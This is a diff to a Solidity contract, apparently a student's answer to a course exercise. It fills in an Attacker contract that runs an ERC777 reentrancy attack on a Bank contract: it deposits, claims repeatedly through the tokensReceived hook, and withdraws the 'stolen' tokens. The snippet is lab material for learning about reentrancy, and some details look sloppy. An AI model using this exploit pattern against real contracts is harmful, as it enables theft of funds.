@@ -24,6 +24,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		_erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
     }
 
+	// This tells the attacker contract the address of the target Bank contract.
 	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
 		bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
@@ -31,17 +32,35 @@ contract Attacker is AccessControl, IERC777Recipient {
 	}
 
 	/*
-	   The main attack function that should start the reentrancy attack
-	   amt is the amt of ETH the attacker will deposit initially to start the attack
+	The main attack function that should start the reentrancy attack
+	amt is the amt of ETH the attacker will deposit initially to start the attack
+
+	This executes the attack by calling the deposit() function and then the withdraw() function on the Bank contract.
+
 	*/
+	
 	function attack(uint256 amt) payable public {
+
       require( address(bank) != address(0), "Target bank not set" );
-		//YOUR CODE TO START ATTACK GOES HERE
+		//TODO: YOUR CODE TO START ATTACK GOES HERE
+		
+		// depth == 0 means that this is the first time the attack function is called
+		if (depth == 0){
+			emit Depost (amt);
+			bank.deposit{value: amt}();
+		}
+
+		if (depth != 0){
+			bank.claimAll();
+		} 
+		
 	}
 
 	/*
 	   After the attack, this contract has a lot of (stolen) MCITR tokens
 	   This function sends those tokens to the target recipient
+
+	   This function allows the owner of Attacker contract to withdraw the stolen ERC777 tokens to a given account.
 	*/
 	function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
 		ERC777 token = bank.token();
@@ -50,6 +69,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 
 	/*
 	   This is the function that gets called when the Bank contract sends MCITR tokens
+
+	   This function is required by the ERC777 token standard, and it’s what allows the reentrancy attack.
 	*/
 	function tokensReceived(
 		address operator,
@@ -59,7 +80,14 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata userData,
 		bytes calldata operatorData
 	) external {
-		//YOUR CODE TO RECURSE GOES HERE
+		//Todo: YOUR CODE TO RECURSE GOES HERE
+
+		if (depth < max_depth){
+			depth += 1;
+			emit Recurse(depth);
+			attack(amount);
+		}
+
 	}
 
 }
